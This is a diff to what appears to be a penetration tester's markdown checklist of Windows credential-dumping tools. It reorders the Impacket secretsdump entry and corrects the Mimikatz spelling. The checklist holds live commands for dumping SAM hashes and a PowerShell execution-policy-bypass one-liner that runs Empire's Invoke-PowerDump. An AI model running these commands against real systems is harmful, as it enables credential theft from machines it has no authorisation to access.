@@ -15,7 +15,10 @@ List of loots to collect
   
   `samdump2 system sam`
   
-- [ ] Mimikats
+- [ ] Impacket
+  - `./secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL`
+  
+- [ ] Mimikatz
   - binaries https://github.com/ParrotSec/mimikatz
   - project https://github.com/gentilkiwi/mimikatz
   - mimikatz cheatsheet https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
@@ -41,10 +44,6 @@ List of loots to collect
 - [ ] Powershell Script
   - https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
   - `powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump}"`
-
-
-- [ ] Impacket
-  - `./secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL`
 
 - [ ] lazagne.exe
   - project https://github.com/AlessandroZ/LaZagne
